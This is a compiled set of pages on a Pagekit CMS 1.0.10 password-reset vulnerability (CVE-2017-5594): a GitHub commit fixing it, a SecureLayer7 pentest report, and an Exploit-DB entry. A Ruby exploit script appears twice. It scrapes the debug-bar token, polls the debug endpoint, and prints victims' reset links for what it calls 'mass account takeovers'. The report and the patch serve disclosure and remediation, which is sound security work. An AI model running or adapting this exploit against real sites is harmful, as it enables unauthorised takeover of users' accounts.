=== Content from github.com_94ec3804_20250125_062431.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpagekit%2Fpagekit%2Fcommit%2Fe0454f9c037c427a5ff76a57e78dbf8cc00c268b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpagekit%2Fpagekit%2Fcommit%2Fe0454f9c037c427a5ff76a57e78dbf8cc00c268b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=pagekit%2Fpagekit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Dec 1, 2023. It is now read-only.

[pagekit](/pagekit)
/
**[pagekit](/pagekit/pagekit)**
Public archive

* [Notifications](/login?return_to=%2Fpagekit%2Fpagekit) You must be signed in to change notification settings
* [Fork
  648](/login?return_to=%2Fpagekit%2Fpagekit)
* [Star
   5.5k](/login?return_to=%2Fpagekit%2Fpagekit)

* [Code](/pagekit/pagekit)
* [Issues
  162](/pagekit/pagekit/issues)
* [Pull requests
  16](/pagekit/pagekit/pulls)
* [Actions](/pagekit/pagekit/actions)
* [Projects
  0](/pagekit/pagekit/projects)
* [Security](/pagekit/pagekit/security)
* [Insights](/pagekit/pagekit/pulse)

Additional navigation options

* [Code](/pagekit/pagekit)
* [Issues](/pagekit/pagekit/issues)
* [Pull requests](/pagekit/pagekit/pulls)
* [Actions](/pagekit/pagekit/actions)
* [Projects](/pagekit/pagekit/projects)
* [Security](/pagekit/pagekit/security)
* [Insights](/pagekit/pagekit/pulse)

## Commit

[Permalink](/pagekit/pagekit/commit/e0454f9c037c427a5ff76a57e78dbf8cc00c268b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge branch 'release/1.0.11'

[Browse files](/pagekit/pagekit/tree/e0454f9c037c427a5ff76a57e78dbf8cc00c268b)
Browse the repository at this point in the history

* Loading branch information

[![@malte-christian](https://avatars.githubusercontent.com/u/3236302?s=40&v=4)](/malte-christian)

[malte-christian](/pagekit/pagekit/commits?author=malte-christian "View all commits by malte-christian")
committed
Jan 20, 2017

2 parents
[f786ca1](/pagekit/pagekit/commit/f786ca160caf618f8de0676f5996ac537e832c8a)
+
[ffe454a](/pagekit/pagekit/commit/ffe454ab9bcb65f8d84a00d99f37f92a54bf56be)

commit e0454f9

 Show file tree

 Hide file tree

Showing
**5 changed files**
with
**29 additions**
and
**14 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* CHANGELOG.md
  [CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed)
* app/system

  + app/system/config.php
    [config.php](#diff-70a84471bfeef7f617a55b954726315bfea8c1ff617cf96d83a1365edc902700)
  + modules

    - settings/app/components

      * app/system/modules/settings/app/components/system.vue
        [system.vue](#diff-ce7761172104be14f5c8bb8e6807dc4cd7725285f98101e4be6a05a76e5393d1)
    - user

      * src/Controller

        + app/system/modules/user/src/Controller/ResetPasswordController.php
          [ResetPasswordController.php](#diff-2f0fcc182576b8e91da79be2ae74d8f0a511aec9bc30a4b2bfcc729d98c3d813)
      * views

        + app/system/modules/user/views/reset-confirm.php
          [reset-confirm.php](#diff-3386031eafc951635ff9b89976dc0cefa3f31ab4850a4cbdb4cadf3c512b44fd)

## There are no files selected for viewing

5 changes: 5 additions & 0 deletions

5
[CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed "CHANGELOG.md")

Show comments

[View file](/pagekit/pagekit/blob/e0454f9c037c427a5ff76a57e78dbf8cc00c268b/CHANGELOG.md)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,5 +1,10 @@ |
|  |  | # Changelog |
|  |  |  |
|  |  | ## 1.0.11 (January 20, 2017) |
|  |  |  |
|  |  | ### Security |
|  |  | - Fixed replay attack with password reset links when debug toolbar is enabled, discovered by SecureLayer7 |
|  |  |  |
|  |  | ## 1.0.10 (December 22, 2016) |
|  |  |  |
|  |  | ### Fixed |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[app/system/config.php](#diff-70a84471bfeef7f617a55b954726315bfea8c1ff617cf96d83a1365edc902700 "app/system/config.php")

Show comments

[View file](/pagekit/pagekit/blob/e0454f9c037c427a5ff76a57e78dbf8cc00c268b/app/system/config.php)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -4,7 +4,7 @@ |
|  |  |  |
|  |  | 'application' => [ |
|  |  |  |
|  |  | 'version' => '1.0.10' |
|  |  | 'version' => '1.0.11' |
|  |  |  |
|  |  | ], |
|  |  |  |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[app/system/modules/settings/app/components/system.vue](#diff-ce7761172104be14f5c8bb8e6807dc4cd7725285f98101e4be6a05a76e5393d1 "app/system/modules/settings/app/components/system.vue")

Show comments

[View file](/pagekit/pagekit/blob/e0454f9c037c427a5ff76a57e78dbf8cc00c268b/app/system/modules/settings/app/components/system.vue)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -34,6 +34,7 @@ |
|  |  | <label><input type="checkbox" value="1" v-model="$root.config.debug.enabled" :disabled="!sqlite"> {{ 'Enable debug toolbar' | trans }}</label> |
|  |  | </p> |
|  |  | <p class="uk-form-help-block" v-if="!sqlite">{{ 'Please enable the SQLite database extension.' | trans }}</p> |
|  |  | <p class="uk-form-help-block" v-if="$root.config.application.debug || $root.config.debug.enabled">{{ 'Please note that enabling debug mode or toolbar has serious security implications.' | trans }}</p> |
|  |  | </div> |
|  |  | </div> |
|  |  |  |
| Expand Down | |  |

33 changes: 21 additions & 12 deletions

33
[app/system/modules/user/src/Controller/ResetPasswordController.php](#diff-2f0fcc182576b8e91da79be2ae74d8f0a511aec9bc30a4b2bfcc729d98c3d813 "app/system/modules/user/src/Controller/ResetPasswordController.php")

Show comments

[View file](/pagekit/pagekit/blob/e0454f9c037c427a5ff76a57e78dbf8cc00c268b/app/system/modules/user/src/Controller/ResetPasswordController.php)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -25,7 +25,7 @@ public function indexAction() |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @Request({"email": "string"}) |
|  |  | \* @Request({"email"}) |
|  |  | \*/ |
|  |  | public function requestAction($email) |
|  |  | { |
| Expand All | | @@ -51,9 +51,8 @@ public function requestAction($email) |
|  |  | throw new Exception(\_\_('Your account has not been activated or is blocked.')); |
|  |  | } |
|  |  |  |
|  |  | $user->activation = App::get('auth.random')->generateString(32); |
|  |  |  |
|  |  | $url = App::url('@user/resetpassword/confirm', ['user' => $user->username, 'key' => $user->activation], 0); |
|  |  | $key = App::get('auth.random')->generateString(32); |
|  |  | $url = App::url('@user/resetpassword/confirm', compact('key'), 0); |
|  |  |  |
|  |  | try { |
|  |  |  |
| Expand All | | @@ -67,6 +66,7 @@ public function requestAction($email) |
|  |  | throw new Exception(\_\_('Unable to send confirmation link.')); |
|  |  | } |
|  |  |  |
|  |  | $user->activation = $key; |
|  |  | $user->save(); |
|  |  |  |
|  |  | App::message()->success(\_\_('Check your email for the confirmation link.')); |
| Expand All | | @@ -85,15 +85,26 @@ public function requestAction($email) |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @Request({"user", "key"}) |
|  |  | \* @Request({"key", "password"}) |
|  |  | \*/ |
|  |  | public function confirmAction($username = "", $activation = "") |
|  |  | public function confirmAction($activation = '', $password = '') |
|  |  | { |
|  |  | if (empty($username) || empty($activation) || !$user = User::where(compact('username', 'activation'))->first()) { |
|  |  | if ($activation and $user = User::where(compact('activation'))->first()) { |
|  |  |  |
|  |  | App::session()->set('activation', [ |
|  |  | 'key' => $activation, |
|  |  | 'user' => $user->id, |
|  |  | ]); |
|  |  |  |
|  |  | $user->activation = null; |
|  |  | $user->save(); |
|  |  | } |
|  |  |  |
|  |  | if (!$data = App::session()->get('activation') or $data['key'] != $activation) { |
|  |  | App::abort(400, \_\_('Invalid key.')); |
|  |  | } |
|  |  |  |
|  |  | if ($user->isBlocked()) { |
|  |  | if (!$user = User::find($data['user']) or $user->isBlocked()) { |
|  |  | App::abort(400, \_\_('Your account has not been activated or is blocked.')); |
|  |  | } |
|  |  |  |
| Expand All | | @@ -105,8 +116,6 @@ public function confirmAction($username = "", $activation = "") |
|  |  | throw new Exception(\_\_('Invalid token. Please try again.')); |
|  |  | } |
|  |  |  |
|  |  | $password = App::request()->request->get('password'); |
|  |  |  |
|  |  | if (empty($password)) { |
|  |  | throw new Exception(\_\_('Enter password.')); |
|  |  | } |
| Expand All | | @@ -115,10 +124,11 @@ public function confirmAction($username = "", $activation = "") |
|  |  | throw new Exception(\_\_('Invalid password.')); |
|  |  | } |
|  |  |  |
|  |  | $user->password = App::get('auth.password')->hash($password); |
|  |  | $user->activation = null; |
|  |  | $user->password = App::get('auth.password')->hash($password); |
|  |  | $user->save(); |
|  |  |  |
|  |  | App::session()->remove('activation'); |
|  |  | App::message()->success(\_\_('Your password has been reset.')); |
|  |  |  |
|  |  | return App::redirect('@user/login'); |
| Expand All | | @@ -133,7 +143,6 @@ public function confirmAction($username = "", $activation = "") |
|  |  | 'title' => \_\_('Reset Confirm'), |
|  |  | 'name' => 'system/user/reset-confirm.php' |
|  |  | ], |
|  |  | 'username' => $username, |
|  |  | 'activation' => $activation, |
|  |  | 'error' => isset($error) ? $error : '' |
|  |  | ]; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[app/system/modules/user/views/reset-confirm.php](#diff-3386031eafc951635ff9b89976dc0cefa3f31ab4850a4cbdb4cadf3c512b44fd "app/system/modules/user/views/reset-confirm.php")

Show comments

[View file](/pagekit/pagekit/blob/e0454f9c037c427a5ff76a57e78dbf8cc00c268b/app/system/modules/user/views/reset-confirm.php)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | <?php $view->script('uikit-form-password') ?> |
|  |  |  |
|  |  | <form class="pk-user pk-user-reset uk-form uk-form-stacked uk-width-medium-1-2 uk-width-large-1-3 uk-container-center" action="<?= $view->url('@user/resetpassword/confirm', ['user' => $username, 'key' => $activation]) ?>" method="post"> |
|  |  | <form class="pk-user pk-user-reset uk-form uk-form-stacked uk-width-medium-1-2 uk-width-large-1-3 uk-container-center" action="<?= $view->url('@user/resetpassword/confirm', ['key' => $activation]) ?>" method="post"> |
|  |  |  |
|  |  | <?php if($error): ?> |
|  |  | <div class="uk-alert uk-alert-danger"> |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e0454f9`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpagekit%2Fpagekit%2Fcommit%2Fe0454f9c037c427a5ff76a57e78dbf8cc00c268b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securelayer7.net_9b46a6f8_20250125_062433.html ===
require 'net/http'
#Enter the domain/IP address of the site for which you want to test this vulnerability
vulnerableSite = 'http://127.0.0.1'
loopCount = 0
while loopCount == 0
#We request the Login page which has the debug parameter
url = URI.parse(vulnerableSite + '/pagekit/index.php/user/login')
request = Net::HTTP::Get.new(url.to\_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}
#The response is received and is sent to many regular expression to find the value of \_debug parameter from its HTML source code
bodyOfResponse = resp.body
myArray1 = bodyOfResponse.split(/"current":"/)
outputOfMyArray1 = myArray1[1]
myArray2 = outputOfMyArray1.split(/"};/)
theSecret = myArray2[0]
puts ""
puts "The secret token to debug link is: #{theSecret}"
puts ""
url = URI.parse(vulnerableSite + '/pagekit/index.php/\_debugbar/' + theSecret)
request = Net::HTTP::Get.new(url.to\_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}
resp.body
initial = resp.body
#The count of number of victim users is found out
users = initial.scan(/user=.+?(?=")/)
c = users.count
e = c.to\_i
#If the count is 0 then we continuosly monitor it
if c == 0 then puts "Currently no user has clicked on reset password like."
puts ""
puts "Trying again..."
puts ""
puts ""
#If the count is greater than 0 then it means we found a victim. So, find the password reset link and display it in the console
else
link1 = vulnerableSite + "/pagekit/index.php/user/resetpassword/confirm?user="
link2 = "&key="
i = 0
while i<e
securityToken = ''
a = real[i]
b = a.split('=')
c = b[1]
d = c.split('\\')
victimUserName = d[0]
puts "The victim is: #{victimUserName}"
f = b[2]
securityToken = f.scan(/[^\\]/)
securityTokenFiltered = securityToken.join
puts "The security token of victim is: #{securityTokenFiltered}"
puts "Link for account takeover"
puts "#{link1}#{victimUserName}#{link2}#{securityTokenFiltered}"
puts ""
puts ""
i += 1
end
end
# This loop runs forever because we want to continuosly monitor who is requesting a password reset and who has clicked on the link so that
# we can perform mass account takeovers
end


=== Content from securelayer7.net_78b06cca_20250125_062432.html ===
Pentest	Report	–	Pagekit	01-2017

https://github.com/pagekit/

SecureLayer7

Index

•  Intro
•  Scope
•  Identified	Vulnerabilities
•  Conclusion

Intro

“Pagekit	 is	 a	 modular	 and	 lightweight	 content	 management	 system.	 It	 gives	 the	 tools	 to	 create
websites.”	-		As	per	Pagekit	website

This	 penetration	 test	 was	 carried	 out	 by	 Securelayer7	 team.	 It	 was	 carried	 out	 for	 4	 days.	 The	 test
identified	one	critical	vulnerability	which	leads	to	vertical/horizontal	authentication	bypass.	It	was	also
found	 that	 Pagekit	 users	 swiftmailer	 version	 5.4.1	 for	 sending	 mails	 which	 has	 been	 recently	 hit	 with
remote	 code	 execution	 vulnerability.	 In	 addition	 to	 that,	 4	 minor	 and	 1	 medium	 vulnerabilities	 were
discovered	that	require	to	be	addressed.

Scope

•
•

Source	code	available	on	Github	(https://github.com/pagekit/)
Locally	hosted	web	application

Testing	environment

•
•

Latest	Kali	Linux	64	bit	2016.2
LAMP

Identified	Vulnerabilities

The	following	sections	list	vulnerabilities.	The	findings	are	listed	in	chronological	order	and	not	by	their
degree	 of	 severity.	 The	 severity	 is	 given	 in	 brackets	 following	 the	 title	 heading.	 Each	 bug	 is	 given	 a
unique	identifier	for	the	purpose	of	future	reference	and	follow-up.

SL7_PGKT_01:	Vertical/Horizontal	Authentication	Bypass	(Critical)

Description:	A	vulnerable	end	point	reveals	the	password	reset	links	clicked	by	all	the	users	of	Pagekit.
This	 means	 whoever	 clicks	 on	 those	 links	 will	 have	 their	 accounts	 compromised.	 No	 privilege	 level	 is
required	 to	 see	 that	 end	 point.	 It	 is	 public.	 So,	 an	 unauthenticated	 attacker	 can	 perform	 complete
account	 takeover.	 Note	 that	 the	 password	 reset	 link	 also	 has	 the	 username	 mentioned	 in	 it.	 So,	 an
account	 takeover	 can	 be	 performed	 because	 the	 attacker	 knows	 both	 the	 password	 and	 username
(password	was	changed	by	him	and	the	username	is	displayed	in	the	reset	link).

The	vulnerable	end	point	is:	/pagekit/index.php/_debugbar/<the	secret	code	here>

The	‘secret	code’	is	nothing	but	the	value	of	debugbar	in	‘<script>var	$debugbar	=
{"current":"60b4b0f6a3fcdf3bff05668401c2ec12c75ee152"};</script>’	js	in	the	HTML	source	of	the	login	page	.

PoC:

1.  Along	with	this	report,	an	exploit	developed	in	Ruby	is	attached.
2.  Execute	it	using	command	prompt.
3.  Login	as	any	user	and	reset	your	password	and	click	on	your	password	reset	link.
4.  Go	to	the	command	prompt	and	observe	that	the	executing	script	captures	the	password	reset

link.

Mitigation:	When	login	page	is	loaded,	the	long	cryptographic	code	is	revealed	in	client	side	JavaScript.
Do	not	disclose	it	there.	If	it	is	not	displayed,	then	no	one	can	use	it	to	find	the	reset	links.	It	is	very	long
so	brute	forcing	is	not	possible,	so	this	will	make	it	safe.

SL7_PGKT_02:	Server	side	information	disclosure	(Medium)

Description:	The	application	has	an	endpoint	that	reveals	following	information:

•
•
•

Some	database	queries
Server	information	including	computer	name,	PHP	version,	SQL	server	name	and	version
Full	path	of	the	web	application

The	end	point	is	the	same	as	the	one	mentioned	in	SL7_PGKT_05.

PoC:

A	file	named	informationdisclosure.json	is	attached	with	this	report.	Please	view	it.

Mitigation:	The	mitigation	is	same	as	that	of	SL7_PGKT_01.

SL7_PGKT_03:	Misconfiguration	.htaccess	(Low)

Description:	 During	 the	 penetration	 testing	 we	 have	 used	 the	 LAMP	 to	 test	 the	 application	 and	 we
found	that	the	.htaccess	does	not	restrict	users	to	access	the	file	phpunit.xml.dst.	It	has	sensitive	data
such	 as	 temporary	 usernames	 and	 passwords	 of	 DB,	 SMTP	 and	 FTP.	 Although,	 the	 credentials	 are	 not
used	 by	 the	 application,	 but	 they	 can	 be	 used	 for	 testing	 purpose	 or	 in	 future	 if	 there	 is	 any
enhancement	in	the	application.	This	is	the	reason,	this	vulnerability	is	reported	with	low	severity.	It	can
also	be	treated	as	informational.

PoC:	Request	the	file	in	browser	and	observe	that	it	is	publicly	available

http://yourpagekitsite.com/phpunit.xml.dst

Mitigation:

1)  For	apache	server.	Please	add	‘|phpunit.xml.dist’	in	line	2	of	.htaccess	file.	After	this	is	done,	any

user	who	requests	it	will	get	a	forbidden	error.

2)  For	 Nginx	 server	 –	 the	 phpunit.xml.dist	 used	 for	 the	 internal	 purposes,	 so	 you	 can	 provide	 IP

based	access	to	the	user.

SL7_PGKT_04:	Weak	Password	Policy	(Low)

When	a	new	user	is	added,	the	application	does	not	enforce	a	password	policy	resulting	in	users	created
having	weak	passwords.	This	is	not	a	good	practice.	Although	it	is	not	a	major	vulnerability,	but	letting
users	use	weak	passwords	make	the	job	of	an	attacker	easier	because	the	passwords	are	then	very	easy
to	guess	and	cracked	with	less	efforts.

PoC:

1.  Login	as	admin	and	go	to	create	new	user	page	(link:
http://127.0.0.1/pagekit/index.php/admin/user/edit)

2.  Enter	valid	details	in	all	the	fields
3.  Enter	password	as	test,	1234.
4.  Click	on	SAVE
5.  Observe	that	the	application	accepts	it

Mitigation:	Implement	server	side	check	that	validate	whether	entered	password	is	of	min	6	characters
or	not.	In	the	following	function:	validate()	(line	number	220-260)	in

pagekit/app/system/modules/user/src/models/user.php	.	It	is	also	recommended	to	user	to	change	the
password	change	password	on	the	first	login.

SL7_PGKT_05:	Sensitive	Information	leakage	via	referrer	header	(Low)

Description:	Password	reset	security	token	gets	leaked	to	third	party	websites	via	referrer	header.	The
homepage	has	a	footer	section	which	has	links	to	third	party	websites	such	as	github,	twitter.	If	a	user
clicks	on	any	of	the	links	then	the	URL	of	the	current	page	gets	sent	to	them	via	referrer	header	and	will
be	seen	in	logs	of	the	web	server	of	those	websites.	Although	you	can	trust	those	sites,	but	it	is	not	a
good	practice	to	include	security	tokens	in	referrer	header	while	navigating	to	third	party	websites.

PoC:

GET	/pagekit	HTTP/1.1
Host:	twitter.com
User-Agent:	Mozilla/5.0	(Windows	NT	6.3;	WOW64;	rv:50.0)	Gecko/20100101	Firefox/50.0
Accept:	text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:	en-US,en;q=0.5
Accept-Encoding:	gzip,	deflate,	br
Referer:
http://127.0.0.1/pagekit/index.php/user/resetpassword/confirm?user=saurabh&key=51mwy/ethCt2SqrTFwKarkk90MMzZkWC
Connection:	keep-alive
Upgrade-Insecure-Requests:	1

Mitigation:	In	order	to	resolve	this,	whenever	the	password	reset	link	gets	loaded	have	the	following	in
code	 between	 <head>	 tags	 of	 the	 html:	 <meta	 name="referrer"	 content="never"	 />	 This	 will	 not	 send
referrer	headers	to	third	party	websites.

SL7_PGKT_06:	Plain	text	storage	of	credentials	(Low)

The	password	for	SMTP	connection	is	stored	in	plain	text	in	the	database.	If	some	other	vulnerability	like
SQL	Injection	causes	the	DB	to	be	compromised,	then	attacker	will	obtain	SMTP	credentials.

PoC:

In	order	to	reproduce	this	issue,	set	smtp	settings	using	admin	panel.

1.
2.  Go	to	DB	and	execute	the	following	query:	SELECT	*	FROM	`pk_system_config`	where	name	like

'%mail%'

Mitigation:	Encrypt	the	password	using	a	script	and	then	store	it	in	DB.	At	the	time	of	sending	email,
decrypt	it	and	then	send	to	the	SMTP	server.

SL7_PGKT_07:	SWIFTMAILER	Remote	Code	Execution	(Low)

Description:	Pagekit	uses	swiftmailer	version	5.4.1	for	sending	mails	to	users.	All	swiftmailer	versions	<=
5.4.5	 are	 vulnerable	 to	 remote	 code	 execution	 (CVE-2016-10074).	 Note	 that	 in	 order	 to	 exploit	 this
vulnerability,	an	attacker	has	to	enter	payload	in	the	‘From’	address	of	the	mails.	But	the	current	Pagekit
application	 does	 not	 have	 any	 functionality	 that	 lets	 users	 do	 that	 (for	 e.g.	 contact	 us).	 But	 it	 is
recommended	that	swiftmailer	library	should	be	upgraded	to	latest	patched	version	because	there	is	a
chance	that	a	contact	us	page	can	be	developed	by	Pagekit	team	in	the	future	as	an	enhancement.

PoC:	Due	to	no	functionality	that	lets	user	modify	‘From’	field	of	an	email,	a	PoC	could	not	be	made.

Mitigation:	Upgrade	swiftmailer	to	latest	patched	version	as	soon	as	the	vendor	patches	it.

Conclusion

One	authentication	bypass	vulnerability	has	been	found	which	should	be	the	point	of	concern.	The	fact
that	this	can	be	remote	exploited	by	an	unauthenticated	user	makes	this	a	severe	impact	issue.		Another
thing	to	be	concern	of	is	the	swiftmailer	library	version	which	is	vulnerable	to	remote	code	execution.
However,	 no	 functionality	 that	 lets	 users	 change	 the	 ‘From’	 mail	 address	 makes	 this	 very	 hard	 to	 be
exploited.	It	should	be	noted	that	the	problems	are	all	implementation	flaws	and	not	design	flaws.	The
findings	are	not	very	hard	to	fix.



=== Content from www.exploit-db.com_e2276dff_20250125_062435.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PageKit 1.0.10 - Password Reset

#### EDB-ID:

###### 41143

#### CVE:

###### [2017-5594](https://nvd.nist.gov/vuln/detail/CVE-2017-5594)

---

**EDB Verified:**

#### Author:

###### [Saurabh Banawar](/?author=8858)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-01-21

---

**Vulnerable App:**

```
# Exploit Title: Remote PageKit Password Reset Vulnerability
# Date:​21-01-2017
# Software Link: http://pagekit.com/
# Exploit Author: Saurabh Banawar from SecureLayer7​

# Contact: http://twitter.com/​securelayer7
# Website: http​s://securelayer7.net​
# Category: webapps

1. Description

Anyremote user can reset the password by reading the debug log, the exploit
can be successfully executed, if the debug option is enabled in the Pagekit
CMS.

CMS Pentest report can be found here:https://securelayer7.net/
download/pdf/SecureLayer7-Pentest-report-Pagekit-CMS.pdf

2. Proof of Concept

​require 'net/http'

#Enter the domain/IP address of the site for which you want to test this vulnerability
vulnerableSite = 'http://127.0.0.1'

loopCount = 0
while loopCount == 0

#We request the Login page which has the debug parameter
url = URI.parse(vulnerableSite + '/pagekit/index.php/user/login')
request = Net::HTTP::Get.new(url.to_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}

#The response is received and is sent to many regular expression to find the value of _debug parameter from its HTML source code
bodyOfResponse =  resp.body
myArray1 = bodyOfResponse.split(/"current":"/)
outputOfMyArray1 = myArray1[1]
myArray2 = outputOfMyArray1.split(/"};/)
theSecret = myArray2[0]
puts ""
puts "The secret token to debug link is: #{theSecret}"
puts ""
url = URI.parse(vulnerableSite + '/pagekit/index.php/_debugbar/' + theSecret)
request = Net::HTTP::Get.new(url.to_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}

resp.body

initial = resp.body

#The count of number of victim users is found out
 users = initial.scan(/user=.+?(?=")/)
 c =  users.count
 e = c.to_i

#If the count is 0 then we continuosly monitor it
 if c == 0 then puts "Currently no user has clicked on reset password like."

 puts ""
 puts "Trying again..."
 puts ""
 puts ""

#If the count is greater than 0 then it means we found a victim. So, find the password reset link and display it in the console
 else

 link1 = vulnerableSite + "/pagekit/index.php/user/resetpassword/confirm?user="
 link2 = "&key="
 i = 0
  while i<e
	securityToken = ''
    a = real[i]
	b = a.split('=')
	c = b[1]
	d = c.split('\\')
	victimUserName = d[0]
	puts "The victim is: #{victimUserName}"
	f = b[2]
	securityToken = f.scan(/[^\\]/)
	securityTokenFiltered = securityToken.join
	puts "The security token of victim is: #{securityTokenFiltered}"
	puts "Link for account takeover"
	puts "#{link1}#{victimUserName}#{link2}#{securityTokenFiltered}"
	puts ""
	puts ""
	i += 1
 end

 end

 # This loop runs forever because we want to continuosly monitor who is requesting a password reset and who has clicked on the link so that
 # we can perform mass account takeovers
 end

3. Solution:

Update to version 1.0.11
https://github.com/pagekit/pagekit/releases/tag/1.0.11

```

**Tags:**

**Advisory/Source:**
Link

